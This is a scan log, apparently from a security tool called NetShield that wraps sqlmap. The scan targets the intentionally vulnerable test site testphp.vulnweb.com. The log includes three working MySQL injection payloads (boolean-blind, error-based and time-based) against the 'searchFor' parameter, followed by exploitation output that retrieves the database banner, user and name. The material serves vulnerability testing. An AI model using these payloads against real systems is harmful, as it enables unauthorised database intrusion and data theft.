[20:15:10] [INFO] [*] Starting QUICK SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
[20:15:10] [INFO] [*] Starting QUICK scan (Detection) on http://testphp.vulnweb.com/artists.php?artist=1
[20:15:10] [INFO] [*] Executing SQLMap...
[20:15:20] [INFO] ___
[20:15:20] [INFO] __H__
[20:15:20] [INFO] ___ ___[,]_____ ___ ___  {1.10.1.12#dev}
[20:15:20] [INFO] |_ -| . [,]     | .'| . |
[20:15:20] [INFO] |___|_  [,]_|_|_|__,|  _|
[20:15:20] [INFO] |_|V...       |_|   https://sqlmap.org
[20:15:20] [INFO] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[20:15:20] [INFO] [*] starting @ 20:15:20 /2026-03-06/
[20:15:20] [INFO] [20:15:20] [WARNING] using 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1' as the output directory
[20:15:20] [INFO] [20:15:20] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
[20:15:20] [INFO] [STAGE] [20:15:20] [INFO] testing connection to the target URL
[20:15:21] [INFO] [20:15:21] [INFO] searching for forms
[20:15:30] [INFO] [1/1] Form:
[20:15:30] [INFO] POST http://testphp.vulnweb.com/search.php?test=query
[20:15:30] [INFO] POST data: searchFor=&goButton=go
[20:15:30] [INFO] do you want to test this form? [Y/n/q]
[20:15:30] [INFO] > Y
[20:15:30] [INFO] Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
[20:15:30] [INFO] do you want to fill blank fields with random values? [Y/n] Y
[20:15:30] [INFO] [20:15:30] [INFO] using 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\results-03062026_0815pm.csv' as the CSV results file in multiple targets mode
[20:15:30] [INFO] [STAGE] [20:15:30] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:15:31] [INFO] [STAGE] [20:15:31] [INFO] testing if the target URL content is stable
[20:15:32] [INFO] [20:15:32] [INFO] target URL content is stable
[20:15:32] [INFO] [STAGE] [20:15:32] [INFO] testing if POST parameter 'searchFor' is dynamic
[20:15:32] [INFO] [20:15:32] [WARNING] POST parameter 'searchFor' does not appear to be dynamic
[20:15:33] [INFO] [20:15:33] [INFO] heuristic (basic) test shows that POST parameter 'searchFor' might be injectable (possible DBMS: 'MySQL')
[20:15:33] [INFO] [+] [20:15:33] [INFO] heuristic (XSS) test shows that POST parameter 'searchFor' might be vulnerable to cross-site scripting (XSS) attacks
[20:15:33] [INFO] [STAGE] [20:15:33] [INFO] testing for SQL injection on POST parameter 'searchFor'
[20:15:33] [INFO] [+] it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[20:15:33] [INFO] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:15:33] [INFO] [STAGE] [20:15:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:15:34] [INFO] [20:15:34] [WARNING] reflective value(s) found and filtering out
[20:15:37] [INFO] [STAGE] [20:15:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:15:37] [INFO] [STAGE] [20:15:37] [INFO] testing 'Generic inline queries'
[20:15:38] [INFO] [STAGE] [20:15:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:15:52] [INFO] [STAGE] [20:15:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:16:05] [INFO] [STAGE] [20:16:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[20:16:19] [INFO] [STAGE] [20:16:19] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[20:16:43] [INFO] [STAGE] [20:16:43] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:17:08] [INFO] [STAGE] [20:17:08] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:17:31] [INFO] [STAGE] [20:17:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[20:17:56] [INFO] [STAGE] [20:17:56] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[20:18:18] [INFO] [STAGE] [20:18:18] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:18:23] [INFO] [20:18:23] [INFO] POST parameter 'searchFor' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable (with --string="Our")
[20:18:23] [INFO] [STAGE] [20:18:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:18:23] [INFO] [STAGE] [20:18:23] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:18:24] [INFO] [STAGE] [20:18:24] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:18:24] [INFO] [STAGE] [20:18:24] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:18:24] [INFO] [STAGE] [20:18:24] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[20:18:24] [INFO] [STAGE] [20:18:24] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[20:18:25] [INFO] [20:18:25] [INFO] POST parameter 'searchFor' is 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' injectable
[20:18:25] [INFO] [STAGE] [20:18:25] [INFO] testing 'MySQL inline queries'
[20:18:25] [INFO] [STAGE] [20:18:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:18:25] [INFO] [STAGE] [20:18:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:18:26] [INFO] [STAGE] [20:18:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:18:26] [INFO] [STAGE] [20:18:26] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:18:26] [INFO] [STAGE] [20:18:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[20:18:27] [INFO] [STAGE] [20:18:27] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[20:18:27] [INFO] [STAGE] [20:18:27] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:18:49] [INFO] [20:18:49] [INFO] POST parameter 'searchFor' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:18:49] [INFO] [STAGE] [20:18:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:18:49] [INFO] [20:18:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:18:55] [INFO] [STAGE] [20:18:55] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[20:19:02] [INFO] [STAGE] [20:19:02] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[20:19:09] [INFO] [STAGE] [20:19:09] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[20:19:15] [INFO] [STAGE] [20:19:15] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[20:19:22] [INFO] [STAGE] [20:19:22] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[20:19:28] [INFO] [STAGE] [20:19:28] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[20:19:34] [INFO] [STAGE] [20:19:34] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[20:19:41] [INFO] [STAGE] [20:19:41] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[20:19:47] [INFO] [STAGE] [20:19:47] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[20:19:54] [INFO] [STAGE] [20:19:54] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[20:20:00] [INFO] [STAGE] POST parameter 'searchFor' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
[20:20:00] [INFO] sqlmap identified the following injection point(s) with a total of 769 HTTP(s) requests:
[20:20:00] [INFO] ---
[20:20:00] [INFO] Parameter: searchFor (POST)
[20:20:00] [INFO] Type: boolean-based blind
[20:20:00] [INFO] Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
[20:20:00] [INFO] Payload: searchFor=PURZ' AND EXTRACTVALUE(6858,CASE WHEN (6858=6858) THEN 6858 ELSE 0x3A END) AND 'pOEq'='pOEq&goButton=go
[20:20:00] [INFO] Type: error-based
[20:20:00] [INFO] Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
[20:20:00] [INFO] Payload: searchFor=PURZ' OR GTID_SUBSET(CONCAT(0x716b707171,(SELECT (ELT(6306=6306,1))),0x7162706a71),6306) AND 'rprL'='rprL&goButton=go
[20:20:00] [INFO] Type: time-based blind
[20:20:00] [INFO] Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
[20:20:00] [INFO] Payload: searchFor=PURZ' AND (SELECT 6406 FROM (SELECT(SLEEP(5)))GtGz) AND 'CBtd'='CBtd&goButton=go
[20:20:00] [INFO] ---
[20:20:00] [INFO] do you want to exploit this SQL injection? [Y/n] Y
[20:20:00] [INFO] [+] [20:20:00] [INFO] the back-end DBMS is MySQL
[20:20:00] [INFO] [DATA] [20:20:00] [INFO] fetching banner
[20:20:01] [INFO] [DATA] [20:20:01] [INFO] retrieved: '8.0.22-0ubuntu0.20.04.2'
[20:20:04] [INFO] web server operating system: Linux Ubuntu
[20:20:04] [INFO] web application technology: PHP 5.6.40, Nginx 1.19.0
[20:20:04] [INFO] [+] back-end DBMS operating system: Linux Ubuntu
[20:20:04] [INFO] [+] back-end DBMS: MySQL >= 5.6
[20:20:04] [INFO] banner: '8.0.22-0ubuntu0.20.04.2'
[20:20:04] [INFO] [DATA] [20:20:04] [INFO] fetching current user
[20:20:04] [INFO] [DATA] [20:20:04] [INFO] retrieved: 'acuart@localhost'
[20:20:04] [INFO] current user: 'acuart@localhost'
[20:20:04] [INFO] [DATA] [20:20:04] [INFO] fetching current database
[20:20:04] [INFO] [DATA] [20:20:04] [INFO] retrieved: 'acuart'
[20:20:04] [INFO] current database: 'acuart'
[20:20:04] [INFO] [STAGE] [20:20:04] [INFO] testing if current user is DBA
[20:20:04] [INFO] [DATA] [20:20:04] [INFO] fetching current user
[20:20:05] [INFO] [20:20:05] [WARNING] potential permission problems detected ('command denied')
[20:20:05] [INFO] [20:20:05] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[20:20:05] [INFO] current user is DBA: False
[20:20:05] [INFO] [20:20:05] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\results-03062026_0815pm.csv'
[20:20:05] [INFO] [+] Scan finished. Processing results...
[20:20:05] [INFO] [INFO] Found SQLMap results directory: testphp.vulnweb.com
[20:20:05] [INFO] [INFO] Parsing log file: D:\NetShield\NetShieldAI\Services\temp\sqlmap\DivyaViradiya_1\testphp.vulnweb.com\log
[20:20:05] [INFO] [+] Successfully parsed 3 vulnerabilities.
[20:20:05] [INFO] [+] SQL JSON report saved to D:\NetShield\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_scanner_testphp_vulnweb_com_artists_php_artist_1.json
[20:20:05] [INFO] EVENT: scan_complete | PAYLOAD: {"status": "success", "target": "http://testphp.vulnweb.com/artists.php?artist=1", "report_file": "D:\\NetShield\\NetShieldAI\\Services\\results\\DivyaViradiya_1\\sql_scanner\\sql_scanner_testphp_vulnweb_com_artists_php_artist_1.json", "vulnerability_count": 3}
[20:20:05] [INFO] [+] SQL scan complete. Generating PDF report for http://testphp.vulnweb.com/artists.php?artist=1...
[20:21:03] [INFO] [+] PDF report generated and updated in user dashboard
[20:21:03] [INFO] SYSTEM_EVENT: READY_FOR_ANALYSIS:http://testphp.vulnweb.com/artists.php?artist=1
